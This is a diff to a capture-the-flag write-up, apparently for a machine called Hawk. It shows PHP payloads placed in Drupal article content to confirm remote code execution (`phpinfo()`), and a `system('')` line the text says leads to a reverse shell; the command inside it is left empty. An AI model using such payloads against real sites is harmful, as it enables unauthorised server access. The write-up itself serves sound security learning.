@@ -407,16 +407,19 @@ Once activated, we leave modules, click on Content -> Add Content -> Article. Co
 
 Click on "preview" anddd.... YES!!!
 
-<br />
-
 PHP Payload -> `<?php phpinfo(); ?>`
+
+<br />
 
 ![6](../../../assets/images/Hawk/6.png)
 
 <br />
 
+Now that we have verified the rce, we proceed to establish a Reverse Shell to gain access to the System:
 
+<br />
 
+PHP Payload -> `<?php system(''); ?>`
 
 
 
